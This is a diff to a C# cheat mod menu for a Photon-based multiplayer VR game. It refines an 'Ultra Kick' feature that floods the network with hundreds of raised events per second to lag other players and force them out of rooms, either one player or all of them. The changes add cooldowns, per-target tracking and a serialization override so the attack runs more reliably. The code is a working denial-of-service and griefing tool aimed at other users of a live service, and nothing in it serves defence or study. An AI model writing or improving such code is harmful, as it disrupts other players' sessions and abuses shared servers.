@@ -8391,6 +8391,9 @@ namespace Quantum.Mods
         }
         // --- Malachi Ultra Kick Sequence ---
         public static string MalachiCredits = "Original logic by Malachi. Implementation by Antigravity. thx <3";
+        private static List<int> ultraKickActors = new List<int>();
+        private static float lastUltraKickGunTime;
+        private static float lastUltraKickAllTime;
 
         public static void UltraKickGun()
         {
@@ -8399,13 +8402,21 @@ namespace Quantum.Mods
                 var GunData = RenderGun();
                 RaycastHit Ray = GunData.Ray;
 
-                if (GetGunInput(true))
+                if (GetGunInput(true) && Time.time > lastUltraKickGunTime + 0.5f)
                 {
                     VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                     if (gunTarget && !gunTarget.IsLocal())
                     {
                         NetPlayer player = GetPlayerFromVRRig(gunTarget);
-                        CoroutineManager.instance.StartCoroutine(UltraKickSequence(player));
+                        if (!ultraKickActors.Contains(player.ActorNumber))
+                        {
+                            lastUltraKickGunTime = Time.time;
+                            CoroutineManager.instance.StartCoroutine(UltraKickSequence(player));
+                        }
+                        else
+                        {
+                            NotificationManager.SendNotification("<color=grey>[</color><color=red>INFO</color><color=grey>]</color> Player already being kicked.");
+                        }
                     }
                 }
             }
@@ -8413,11 +8424,12 @@ namespace Quantum.Mods
 
         public static void UltraKickAll()
         {
-            if (!PhotonNetwork.InRoom) return;
+            if (!PhotonNetwork.InRoom || Time.time < lastUltraKickAllTime + 2f) return;
+            lastUltraKickAllTime = Time.time;
 
             foreach (NetPlayer player in NetworkSystem.Instance.AllNetPlayers)
             {
-                if (!player.IsLocal)
+                if (!player.IsLocal && !ultraKickActors.Contains(player.ActorNumber))
                 {
                     CoroutineManager.instance.StartCoroutine(UltraKickSequence(player));
                 }
@@ -8426,6 +8438,9 @@ namespace Quantum.Mods
 
         public static IEnumerator UltraKickSequence(NetPlayer target)
         {
+            if (ultraKickActors.Contains(target.ActorNumber)) yield break;
+            ultraKickActors.Add(target.ActorNumber);
+
             VRRig targetRig = GetVRRigFromPlayer(target);
             string name = targetRig != null ? targetRig.GetName() : target.NickName;
 
@@ -8436,14 +8451,18 @@ namespace Quantum.Mods
             bool wasFlying = Buttons.GetIndex("Fly").enabled;
             if (!wasFlying) Toggle("Fly");
 
+            // Setup Serialization Override
+            SerializePatch.OverrideSerialization = () => false;
+            RPCProtection();
+
             float startTime = Time.time;
             for (int i = 7; i > 0; i--)
             {
                 NotificationManager.SendNotification($"<color=grey>[</color><color=red>KICKING</color><color=grey>]</color> {name} in {i} seconds...", 1000);
                 
-                // Freeze phase (Lag packets)
+                // Freeze phase (Lag packets) - Balanced frequency
                 int view = PhotonNetwork.AllocateViewID(0);
-                for (int j = 0; j < 500; j++)
+                for (int j = 0; j < 250; j++)
                 {
                     PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new Hashtable
                     {
@@ -8476,9 +8495,9 @@ namespace Quantum.Mods
                 }, SendOptions.SendReliable);
             }
 
-            yield return new WaitForSeconds(0.5f);
+            yield return new WaitForSeconds(1.5f);
 
-            if (PhotonNetwork.PlayerList.Any(p => p.UserId == target.UserId))
+            if (PhotonNetwork.PlayerList.Any(p => p.ActorNumber == target.ActorNumber))
             {
                 NotificationManager.SendNotification($"<color=grey>[</color><color=red>ERROR</color><color=grey>]</color> Kick Failed for {name}. They might have anti-kick.");
             }
@@ -8488,7 +8507,9 @@ namespace Quantum.Mods
             }
 
             // Cleanup
+            SerializePatch.OverrideSerialization = null;
             if (!wasFlying) Toggle("Fly");
+            ultraKickActors.Remove(target.ActorNumber);
         }
     }
 }
